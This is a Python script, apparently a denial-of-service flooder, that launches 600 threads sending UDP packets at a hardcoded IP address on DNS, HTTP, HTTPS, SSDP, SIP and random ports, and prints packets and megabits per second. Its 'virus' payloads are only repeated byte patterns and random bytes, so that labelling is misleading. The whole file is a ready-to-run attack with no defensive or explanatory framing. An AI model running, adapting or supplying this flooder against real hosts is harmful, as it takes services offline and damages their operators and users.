import socket
import threading
import time
import random

TARGET_IP = "195.154.218.179"

# VIRUS DATA GENERATION
def virus_payload(size):
    # Generate virus-like corrupt data
    virus_core = [
        b'\xDE\xAD\xBE\xEF' * (size // 4),  # Memory corruption
        b'\xCA\xFE\xBA\xBE' * (size // 4),  # Code corruption
        b'\x00\xFF\x00\xFF' * (size // 4),  # Bit flipping
        b'\xAA\x55\xAA\x55' * (size // 4),  # Pattern virus
        random.randbytes(size),  # Random virus
        bytes([i % 256 for i in range(size)]),  # Sequential virus
    ]
    return random.choice(virus_core)[:size]

# THREAD CONFIG
BANDWIDTH_THREADS = 300  # Large virus packets
PPS_THREADS = 300        # Small virus packets
TOTAL_THREADS = 600

# Global counters
virus_packets = 0
virus_bytes = 0

# ==================== BANDWIDTH VIRUS CANNON ====================
def bandwidth_virus_cannon(thread_id):
    global virus_packets, virus_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # LARGE VIRUS PAYLOADS (800-1472 bytes)
            for _ in range(8):
                size = random.randint(800, 1472)
                payload = virus_payload(size)
                
                # Attack all bandwidth-heavy ports
                for port in [53, 80, 443, 1900, 5060]:
                    sock.sendto(payload, (TARGET_IP, port))
                    virus_packets += 1
                    virus_bytes += size
                
                # Random ports too
                for _ in range(3):
                    port = random.randint(1, 65535)
                    sock.sendto(payload, (TARGET_IP, port))
                    virus_packets += 1
                    virus_bytes += size
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== PPS VIRUS STORM ====================
def pps_virus_storm(thread_id):
    global virus_packets, virus_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # SMALL VIRUS PAYLOADS (64-256 bytes) MAX PPS
            for _ in range(20):
                size = random.randint(64, 256)
                payload = virus_payload(size)
                
                # Rapid fire to DNS/HTTP ports
                sock.sendto(payload, (TARGET_IP, 53))
                virus_packets += 1
                virus_bytes += size
                
                sock.sendto(payload, (TARGET_IP, 80))
                virus_packets += 1
                virus_bytes += size
                
                sock.sendto(payload, (TARGET_IP, 443))
                virus_packets += 1
                virus_bytes += size
                
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== LAUNCH ====================
# Start Bandwidth Virus Cannons
for i in range(BANDWIDTH_THREADS):
    t = threading.Thread(target=bandwidth_virus_cannon, args=(i,))
    t.daemon = True
    t.start()

# Start PPS Virus Storm
for i in range(PPS_THREADS):
    t = threading.Thread(target=pps_virus_storm, args=(i,))
    t.daemon = True
    t.start()

# ==================== LOGGING ONLY ====================
last_log = time.time()

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate
    pps = int(virus_packets / elapsed) if elapsed > 0 else 0
    mbps = (virus_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    
    # Reset
    virus_packets = 0
    virus_bytes = 0
    
    # LOGGING ONLY
    print(f"SK1-SSALG | {pps:,}/s | {mbps:.1f}Mbps")
